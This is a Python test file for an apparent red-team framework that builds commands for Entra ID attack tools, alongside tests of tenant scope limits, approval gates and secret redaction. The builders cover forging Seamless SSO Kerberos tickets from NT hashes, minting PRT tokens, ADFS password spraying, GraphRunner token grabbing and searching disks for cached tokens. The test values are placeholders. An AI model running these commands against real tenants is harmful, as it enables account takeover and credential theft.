"""Phase 9 tests: Entra/hybrid manifests, builders, scope, redaction, JSON verify."""

from __future__ import annotations

from pathlib import Path

import pytest
from pydantic import SecretStr

from redstrike.builders import EntraBuilder
from redstrike.core.manifest import TOOL_MANIFEST, probe_tool_version
from redstrike.core.policy import ScopePolicy
from redstrike.core.runner import CommandRunner, redact_argv
from redstrike.core.secrets import extract_secrets, scrub_output
from redstrike.runtime.graph import load_campaign_graph
from redstrike.runtime.hitl import KNOWN_GATES
from redstrike.runtime.intents import DEFAULT_REGISTRY
from redstrike.runtime.ledger import Credential, CredentialLedger
from redstrike.runtime.verify import verify_step_output

JWT = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
    "eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpYXQiOjE3MDAwMDAwMDB9."
    "c2lnbmF0dXJlLWJ5dGVzLWhlcmUtMTIzNDU2Nzg5MA"
)


# ---------------------------------------------------------------------------
# 9.1 Manifests
# ---------------------------------------------------------------------------

def test_hybrid_manifest_entries_present() -> None:
    by_name = {spec.name: spec for spec in TOOL_MANIFEST}
    for name in ("az", "azurehound", "roadtools", "aadinternals", "adfspray"):
        assert name in by_name, name
        assert by_name[name].category == "Hybrid Identity (Entra ID)"
    assert by_name["az"].version_regex
    assert by_name["roadtools"].python_module == "roadtools"
    assert by_name["aadinternals"].ps_module == "AADInternals"


def test_az_version_regex_matches_cli_json() -> None:
    import re

    spec = next(s for s in TOOL_MANIFEST if s.name == "az")
    sample = '{"azure-cli": "2.63.0", "azure-cli-core": "2.63.0"}'
    match = re.search(spec.version_regex, sample, re.IGNORECASE)
    assert match and match.group("v") == "2.63.0"


def test_ps_module_probe_missing_shell(monkeypatch) -> None:
    from redstrike.core import manifest as manifest_mod

    monkeypatch.setattr(manifest_mod.shutil, "which", lambda _name: None)
    spec = next(s for s in TOOL_MANIFEST if s.name == "aadinternals")
    status = probe_tool_version(spec)
    assert status.found is False and status.status == "missing"


def test_ps_module_probe_detects_version(monkeypatch) -> None:
    from redstrike.core import manifest as manifest_mod

    class _Done:
        returncode = 0
        stdout = "0.11.2\n"
        stderr = ""

    monkeypatch.setattr(
        manifest_mod.shutil,
        "which",
        lambda name: r"C:\pwsh.exe" if name == "pwsh" else None,
    )
    monkeypatch.setattr(manifest_mod.subprocess, "run", lambda *a, **k: _Done())
    spec = next(s for s in TOOL_MANIFEST if s.name == "aadinternals")
    status = probe_tool_version(spec)
    assert status.found is True
    assert status.version == "0.11.2"


# ---------------------------------------------------------------------------
# 9.2 Builders (argv shapes verified against upstream docs)
# ---------------------------------------------------------------------------

def test_az_rest_builder_flags() -> None:
    argv = EntraBuilder().graph_query(
        url="https://graph.microsoft.com/v1.0/users",
        query="value[].userPrincipalName",
        headers={"ConsistencyLevel": "eventual"},
    )
    assert argv == [
        "az", "rest", "--method", "get",
        "--url", "https://graph.microsoft.com/v1.0/users",
        "--headers", "ConsistencyLevel=eventual",
        "--query", "value[].userPrincipalName",
    ]
    with pytest.raises(ValueError):
        EntraBuilder().graph_query(url="https://x", method="fetch")


def test_az_login_and_account_show() -> None:
    builder = EntraBuilder()
    login = builder.az_login_service_principal(
        app_id="11111111-2222-3333-4444-555555555555",
        secret=SecretStr("s3cret"),
        tenant="contoso.onmicrosoft.com",
    )
    assert login == [
        "az", "login", "--service-principal",
        "--username", "11111111-2222-3333-4444-555555555555",
        "--password", "s3cret",
        "--tenant", "contoso.onmicrosoft.com",
        "--allow-no-subscriptions",
    ]
    assert builder.az_account_show() == ["az", "account", "show", "--query", "tenantId", "-o", "json"]


def test_azurehound_builders() -> None:
    """Flag placement per the upstream README quickstart: flags AFTER `list`."""
    builder = EntraBuilder()
    argv = builder.azurehound_collect(
        username="analyst@contoso.onmicrosoft.com",
        password=SecretStr("pw"),
        tenant="contoso.onmicrosoft.com",
        output="/tmp/az.json",
    )
    assert argv == [
        "azurehound", "list",
        "-u", "analyst@contoso.onmicrosoft.com",
        "-p", "pw",
        "-t", "contoso.onmicrosoft.com",
        "-o", "/tmp/az.json",
    ]
    users = builder.user_role_enum(
        username="u", password="p", tenant="t", output="o.json"
    )
    assert users[0:3] == ["azurehound", "list", "users"]
    assert users[-4:] == ["-t", "t", "-o", "o.json"]

    # Documented CLI-auth path: az token -> --jwt (there is no --az-cli-auth flag)
    jwt_argv = builder.azurehound_collect_jwt(jwt=SecretStr(JWT), output="o.json")
    assert jwt_argv == ["azurehound", "list", "--jwt", JWT, "-o", "o.json"]


def test_roadtx_hybrid_builders() -> None:
    """Commands mirrored from the HackTricks cloud-Kerberos-trust page."""
    builder = EntraBuilder()
    tokens = builder.roadtx_gettokens(
        username="admin@contoso.onmicrosoft.com", password=SecretStr("pw")
    )
    assert tokens == [
        "roadtx", "gettokens", "-u", "admin@contoso.onmicrosoft.com",
        "-p", "pw", "-r", "aadgraph",
    ]
    prt = builder.roadtx_prt(
        username="user@contoso.onmicrosoft.com",
        password=SecretStr("pw"),
        key_pem="DeviceKey.pem",
        cert_pem="DeviceCertificate.pem",
    )
    assert prt == [
        "roadtx", "prt", "-u", "user@contoso.onmicrosoft.com", "-p", "pw",
        "--key-pem", "DeviceKey.pem", "--cert-pem", "DeviceCertificate.pem",
    ]
    modify = builder.hybrid_script(
        args=("-a", "IMMUTABLE-ID", "-sid", "S-1-5-21-1-2-3-1101", "-sam", "administrator"),
        binary="modifyuser.py",
    )
    assert modify[0] == "modifyuser.py"
    assert "-sid" in modify and "S-1-5-21-1-2-3-1101" in modify
    exchange = builder.hybrid_script(
        args=("corp.local/administrator", "-f", "roadtx.prt"),
        binary="partialtofulltgt.py",
    )
    assert exchange == ["partialtofulltgt.py", "corp.local/administrator", "-f", "roadtx.prt"]


def test_roadrecon_builders() -> None:
    builder = EntraBuilder()
    assert builder.roadrecon_auth(username="u", password=SecretStr("p"), tenant="t") == [
        "roadrecon", "auth", "-u", "u", "-p", "p", "-t", "t",
    ]
    assert builder.roadrecon_auth_token(access_token=SecretStr(JWT)) == [
        "roadrecon", "auth", "--access-token", JWT,
    ]
    assert builder.roadrecon_auth_prt(prt=SecretStr("prt-val"), session_key=SecretStr("skey")) == [
        "roadrecon", "auth", "--prt", "prt-val", "--prt-sessionkey", "skey",
    ]
    assert builder.roadrecon_gather() == ["roadrecon", "gather"]
    assert builder.roadrecon_gather(auth_file=".roadtools_auth", mfa=True) == [
        "roadrecon", "gather", "-f", ".roadtools_auth", "--mfa",
    ]


def test_aadinternals_seamless_sso_ticket() -> None:
    builder = EntraBuilder()
    sid_argv = builder.seamless_sso_ticket(
        sid_string="S-1-5-21-854568531-3289094026-2628502219-1111",
        nt_hash=SecretStr("31d6cfe0d16ae931b73c59d7e0c089c0"),
    )
    assert sid_argv[0] == "powershell"
    command = sid_argv[-1]
    assert "Import-Module AADInternals" in command
    assert "New-AADIntKerberosTicket" in command
    assert "-SidString 'S-1-5-21-854568531-3289094026-2628502219-1111'" in command
    assert "-Hash '31d6cfe0d16ae931b73c59d7e0c089c0'" in command

    pw_argv = builder.seamless_sso_ticket(ad_upn="user@corp.local", password=SecretStr("sso-pw"))
    assert "-ADUserPrincipalName 'user@corp.local'" in pw_argv[-1]
    assert "-Password 'sso-pw'" in pw_argv[-1]

    with pytest.raises(ValueError):
        builder.seamless_sso_ticket(sid_string="S-1-5", password=None, nt_hash=None)
    with pytest.raises(ValueError):
        builder.seamless_sso_ticket(aad_upn="u@t", password=SecretStr("x"))  # needs access_token


def test_aadinternals_prt_and_shim() -> None:
    builder = EntraBuilder()
    argv = builder.prt_token(refresh_token=SecretStr("rt"), session_key=SecretStr("sk"))
    command = argv[-1]
    assert "New-AADIntUserPRTToken" in command
    assert "-RefreshToken 'rt'" in command and "-SessionKey 'sk'" in command
    assert command.endswith("-GetNonce")

    shim = builder.adfs_spray(args=("--target", "https://adfs.contoso.com", "adfs"))
    assert shim == ["ADFSpray.py", "--target", "https://adfs.contoso.com", "adfs"]


def test_entra_intents_registered_and_build() -> None:
    known = DEFAULT_REGISTRY.known()
    for intent in (
        "entra.az_login", "entra.account_show", "entra.graph_query",
        "entra.azurehound_collect", "entra.user_role_enum",
        "entra.roadrecon_auth", "entra.roadrecon_gather",
        "entra.kerberos_ticket", "entra.prt_token", "entra.adfs_spray",
    ):
        assert intent in known, intent

    spec = DEFAULT_REGISTRY.build_spec(
        "entra.azurehound_collect",
        {"username": "u", "password": "pw", "tenant": "t", "output": "o.json"},
    )
    assert spec.argv[0] == "azurehound"
    spec = DEFAULT_REGISTRY.build_spec(
        "entra.kerberos_ticket",
        {"ad_upn": "user@corp.local", "password": "sso-pw"},
    )
    assert spec.argv[0] == "powershell"


def test_cloud_takeover_gate_known() -> None:
    assert "cloud_takeover" in KNOWN_GATES


# ---------------------------------------------------------------------------
# 9.3 Scope: tenants in the policy + campaign-path enforcement
# ---------------------------------------------------------------------------

def test_tenant_scope_matching() -> None:
    policy = ScopePolicy(
        allowed_tenants=["contoso.onmicrosoft.com"],
        allowed_cloud_domains=["contoso.onmicrosoft.com"],
    )
    assert policy.cloud_scope_configured()
    policy.assert_cloud_scope("contoso.onmicrosoft.com")
    policy.assert_cloud_scope("CONTOSO.ONMICROSOFT.COM")
    with pytest.raises(PermissionError):
        policy.assert_cloud_scope("fabrikam.onmicrosoft.com")

    guid_policy = ScopePolicy(allowed_tenants=["11111111-2222-3333-4444-555555555555"])
    guid_policy.assert_cloud_scope("11111111-2222-3333-4444-555555555555")
    with pytest.raises(PermissionError):
        guid_policy.assert_cloud_scope("99999999-0000-0000-0000-000000000000")


def test_cloud_node_scope_enforcement_in_orchestrator(tmp_path: Path) -> None:
    from redstrike.core.models import CommandResult
    from redstrike.runtime.beachhead import Beachhead
    from redstrike.runtime.orchestrator import CampaignOrchestrator

    class StubRunner:
        def run(self, argv, **kwargs) -> CommandResult:
            # Never touches a real binary: the scope gate decides BEFORE this runs.
            return CommandResult(
                command=list(argv), return_code=0, stdout="CLOUD_1_OK\n", stderr="", duration_seconds=0.0,
            )

    graph = tmp_path / "cloud.yaml"
    graph.write_text(
        "version: 1\nname: cloud\nnodes:\n"
        "  - id: CLOUD-1\n"
        "    phase: 9\n"
        "    path: linux60\n"
        "    beachheads: [linux]\n"
        "    title: entra probe\n"
        "    intent: entra.account_show\n"
        "    intent_args:\n"
        "      tenant: fabrikam.onmicrosoft.com\n",
        encoding="utf-8",
    )

    # No cloud scope configured → fail closed.
    orch = CampaignOrchestrator(
        engagement_id="phase9-cloud-none",
        beachhead=Beachhead.LINUX,
        automation_root=tmp_path,
        graph_path=graph,
        ledger_root=tmp_path / "ledgers",
        runner=StubRunner(),
    )
    results = orch.run("9", dry_run=False, stop_on_hitl=False)
    assert results[0].skipped is True
    assert "scope policy" in (results[0].skip_reason or "")

    # Tenant explicitly allowed → scope check passes and the step executes.
    allowed = CampaignOrchestrator(
        engagement_id="phase9-cloud-ok",
        beachhead=Beachhead.LINUX,
        automation_root=tmp_path,
        graph_path=graph,
        ledger_root=tmp_path / "ledgers",
        scope_policy=ScopePolicy(allowed_tenants=["fabrikam.onmicrosoft.com"]),
        runner=StubRunner(),
    )
    results = allowed.run("9", dry_run=False, stop_on_hitl=False)
    assert results[0].skipped is False
    assert results[0].verified is True

    # Tenant NOT allowed → blocked with the tenant named.
    denied = CampaignOrchestrator(
        engagement_id="phase9-cloud-denied",
        beachhead=Beachhead.LINUX,
        automation_root=tmp_path,
        graph_path=graph,
        ledger_root=tmp_path / "ledgers",
        scope_policy=ScopePolicy(allowed_tenants=["contoso.onmicrosoft.com"]),
        runner=StubRunner(),
    )
    results = denied.run("9", dry_run=False, stop_on_hitl=False)
    assert results[0].skipped is True
    assert "fabrikam.onmicrosoft.com" in (results[0].skip_reason or "")


# ---------------------------------------------------------------------------
# 9.3 Redaction: JWTs / bearer / labeled tokens
# ---------------------------------------------------------------------------

def test_scrub_output_masks_entra_tokens() -> None:
    text = (
        f'{{"access_token": "{JWT}"}}\n'
        "Authorization: Bearer " + JWT + "\n"
        f"client_secret={JWT}\n"
    )
    scrubbed = scrub_output(text)
    assert JWT not in scrubbed
    assert "[REDACTED:jwt]" in scrubbed or "[REDACTED:token]" in scrubbed
    found = extract_secrets(text)
    assert any(item.kind == "jwt" for item in found)
    assert any(item.kind == "token" for item in found)


def test_redact_argv_entra_flags_and_tokenish_short_flags() -> None:
    argv = redact_argv(
        ["entra", "--access-token", JWT, "--refresh-token", JWT, "--prt", "prtval",
         "--client-secret", "cs"]
    )
    assert "***REDACTED***" == argv[2] == argv[4] == argv[6] == argv[8]
    # azurehound -j/-r short flags: mask only tokenish values
    refresh_token = "0." + "ARwA6Wg0ABCdef" * 6  # realistic refresh-token length
    hound = redact_argv(["azurehound", "-u", "u", "-j", JWT, "-r", refresh_token, "-t", "t"])
    assert hound[4] == "***REDACTED***"
    assert hound[6] == "***REDACTED***"
    harmless = redact_argv(["python", "-j", "4", "-r", "x"])
    assert harmless == ["python", "-j", "4", "-r", "x"]


def test_redact_argv_leaves_urls_intact() -> None:
    """Regression: the impacket user:pass rule must not eat URL scheme colons
    (live-caught on `az rest --url https://graph.microsoft.com/...`)."""
    argv = redact_argv(["az", "rest", "--method", "get", "--url", "https://graph.microsoft.com/v1.0/users"])
    assert argv[5] == "https://graph.microsoft.com/v1.0/users"
    # real impacket form still redacts
    impacket = redact_argv(["GetUserSPNs.py", "EXAMPLE.LAB/Administrator:Passw0rd!"])
    assert impacket[1] == "EXAMPLE.LAB/Administrator:***REDACTED***"


def test_ledger_token_credentials_and_setdefault(tmp_path: Path) -> None:
    ledger = CredentialLedger("phase9-ledger", root=tmp_path)
    ledger.put(
        Credential(
            name="graph-token",
            username="analyst@contoso.onmicrosoft.com",
            token=JWT,
            cred_type="token",
            source="earned:CLOUD-1",
        )
    )
    reloaded = CredentialLedger("phase9-ledger", root=tmp_path)
    cred = reloaded.get("graph-token")
    assert cred.token == JWT and cred.cred_type == "token"
    assert cred.has_material()

    # setdefault: a placeholder is upgraded by real material, then preserved
    placeholder = Credential(name="earned", username="earned", source="earned:X")
    upgraded = Credential(name="earned", username="u", nt_hash="a" * 32, source="earned:X")
    assert ledger.setdefault(placeholder).has_material() is False
    assert ledger.setdefault(upgraded).nt_hash == "a" * 32
    keep = Credential(name="earned", username="u2", nt_hash="b" * 32, source="earned:Y")
    assert ledger.setdefault(keep).nt_hash == "a" * 32  # never downgraded/overwritten


def test_orchestrator_parses_jwt_into_token_credential(tmp_path: Path) -> None:
    from redstrike.core.models import CommandResult
    from redstrike.runtime.beachhead import Beachhead
    from redstrike.runtime.orchestrator import CampaignOrchestrator

    graph = tmp_path / "tok.yaml"
    graph.write_text(
        "version: 1\nname: tok\nnodes:\n"
        "  - id: TOK\n"
        "    phase: 1\n"
        "    path: linux60\n"
        "    beachheads: [linux]\n"
        "    title: token step\n"
        "    intent: entra.account_show\n"
        "    produces_cred: graph_token\n",
        encoding="utf-8",
    )

    class StubRunner:
        def run(self, argv, **kwargs) -> CommandResult:
            return CommandResult(
                command=list(argv), return_code=0,
                stdout=f'{{"access_token": "{JWT}"}}\nTOK_OK\n',
                stderr="", duration_seconds=0.0,
            )

    orch = CampaignOrchestrator(
        engagement_id="phase9-token-cred",
        beachhead=Beachhead.LINUX,
        automation_root=tmp_path,
        graph_path=graph,
        ledger_root=tmp_path / "ledgers",
        runner=StubRunner(),
    )
    results = orch.run("1", dry_run=False, stop_on_hitl=False)
    assert results[0].verified is True
    cred = orch.ledger.get("graph_token")
    assert cred is not None and cred.cred_type == "token" and cred.token == JWT


# ---------------------------------------------------------------------------
# 9.3 Structured JSON verification
# ---------------------------------------------------------------------------

def test_verify_json_matches_path() -> None:
    output = '{"tenantId": "11111111-2222-3333-4444-555555555555", "id": "x"}'
    good = verify_step_output(
        node_id="AZ", return_code=0, stdout=output,
        success_json=("tenantId", "11111111-2222-3333-4444-555555555555"),
    )
    assert good.verified is True
    assert "success_json tenantId" in good.reason

    mismatch = verify_step_output(
        node_id="AZ", return_code=0, stdout=output,
        success_json=("tenantId", "99999999-0000-0000-0000-000000000000"),
    )
    assert mismatch.verified is False and "!=" in mismatch.reason

    missing = verify_step_output(
        node_id="AZ", return_code=0, stdout=output, success_json=("nope", "x")
    )
    assert missing.verified is False and "missing" in missing.reason

    no_json = verify_step_output(
        node_id="AZ", return_code=0, stdout="not json at all",
        success_json=("tenantId", "x"),
    )
    assert no_json.verified is False

    # Marker is not required when success_json is set, but fail patterns still veto
    vetoed = verify_step_output(
        node_id="AZ", return_code=0, stdout=output + "\nAccess is denied",
        success_json=("tenantId", "11111111-2222-3333-4444-555555555555"),
    )
    assert vetoed.verified is False


def test_graph_success_json_parsing(tmp_path: Path) -> None:
    graph = tmp_path / "sj.yaml"
    graph.write_text(
        "version: 1\nname: sj\nnodes:\n"
        "  - id: A\n    phase: 1\n    title: a\n    path: direct\n    stub: true\n"
        "    success_json:\n      path: tenantId\n      equals: abc\n",
        encoding="utf-8",
    )
    node = load_campaign_graph(graph).nodes[0]
    assert node.success_json == {"path": "tenantId", "equals": "abc"}

    bad = tmp_path / "sj-bad.yaml"
    bad.write_text(
        "version: 1\nname: sj\nnodes:\n"
        "  - id: A\n    phase: 1\n    title: a\n    path: direct\n    stub: true\n"
        "    success_json:\n      equals: abc\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="success_json requires a 'path'"):
        load_campaign_graph(bad)


def test_runner_accepts_az_style_timeout_kwarg() -> None:
    runner = CommandRunner()
    result = runner.run(["python", "-c", "print('ok')"], timeout_seconds=10)
    assert result.return_code == 0 and "ok" in result.stdout


# ---------------------------------------------------------------------------
# KB-driven additions (CARTP/CARTE lab manuals, AlteredSecurity 2025)
# ---------------------------------------------------------------------------

def test_roadrecon_device_code_and_course_tools() -> None:
    builder = EntraBuilder()
    # CARTP lab: roadrecon auth -c 1950a258-227b-4e31-a9cf-717495945fc2 --device-code
    assert builder.roadrecon_auth_device_code(
        client_id="1950a258-227b-4e31-a9cf-717495945fc2"
    ) == ["roadrecon", "auth", "-c", "1950a258-227b-4e31-a9cf-717495945fc2", "--device-code"]
    assert builder.roadrecon_auth_device_code() == ["roadrecon", "auth", "--device-code"]

    # CARTP lab LO7: Monkey365 exact parameters
    monkey_argv = builder.monkey365(
        module_path=r"C:\AzAD\Tools\monkey365\monkey365.psd1", force_auth=True
    )
    assert monkey_argv[0] == "powershell"
    command = monkey_argv[-1]
    assert "Invoke-Monkey365" in command
    assert "-IncludeEntraID" in command
    assert "-ExportTo 'HTML'" in command
    assert "-Instance 'Azure'" in command
    assert "-ForceAuth" in command
    assert "-Collect 'All'" in command

    # CARTE lab: GraphRunner entry points only
    tokens = builder.graphrunner(
        module_path=r"C:\AzAD\Tools\GraphRunner-main\GraphRunner.ps1"
    )
    assert tokens[-1].endswith("Get-GraphTokens")
    recon = builder.graphrunner(module_path="GraphRunner.ps1", action="Invoke-GraphRecon")
    assert recon[-1].endswith("Invoke-GraphRecon")
    with pytest.raises(ValueError):
        builder.graphrunner(module_path="GraphRunner.ps1", action="Invoke-Anything")


def test_course_tools_in_manifest_and_intents() -> None:
    names = {spec.name for spec in TOOL_MANIFEST}
    assert {"monkey365", "graphrunner", "mfasweep"} <= names
    known = set(DEFAULT_REGISTRY.known())
    assert {
        "entra.monkey365",
        "entra.graphrunner",
        "entra.roadrecon_auth_device_code",
    } <= known


# ---------------------------------------------------------------------------
# HackTricks-sourced additions (Azure security wiki: whoami / RBAC / token caches)
# ---------------------------------------------------------------------------

def test_az_whoami_and_rbac_builders() -> None:
    builder = EntraBuilder()
    assert builder.az_signed_in_user() == ["az", "ad", "signed-in-user", "show"]
    assert builder.az_signed_in_user(query="{id:objectId}") == [
        "az", "ad", "signed-in-user", "show", "--query", "{id:objectId}",
    ]
    assert builder.az_account_list(all_subscriptions=True) == ["az", "account", "list", "--all", "-o", "json"]
    assert builder.az_account_list() == ["az", "account", "list", "-o", "json"]

    rbac = builder.az_role_assignment_list(assignee="analyst@contoso.com", query="[].roleDefinitionName")
    assert rbac[:6] == ["az", "role", "assignment", "list", "-o", "json"]
    assert "--all" in rbac and "--assignee" in rbac
    assert rbac[rbac.index("--assignee") + 1] == "analyst@contoso.com"
    assert "--query" in rbac


def test_token_artifacts_builder_and_intents() -> None:
    builder = EntraBuilder()
    argv = builder.token_artifacts(root=r"C:\Users\analyst")
    assert argv[0] == "powershell"
    command = argv[-1]
    assert "Get-ChildItem" in command
    assert "'msal_token_cache.json'" in command
    assert "'az-context.json'" in command
    assert r"'C:\Users\analyst'" in command

    known = set(DEFAULT_REGISTRY.known())
    assert {
        "entra.signed_in_user",
        "entra.account_list",
        "entra.role_assignment_list",
        "entra.token_artifacts",
    } <= known
    spec = DEFAULT_REGISTRY.build_spec("entra.role_assignment_list", {"assignee": "a@b.c"})
    assert spec.argv[0] == "az" and "--all" in spec.argv
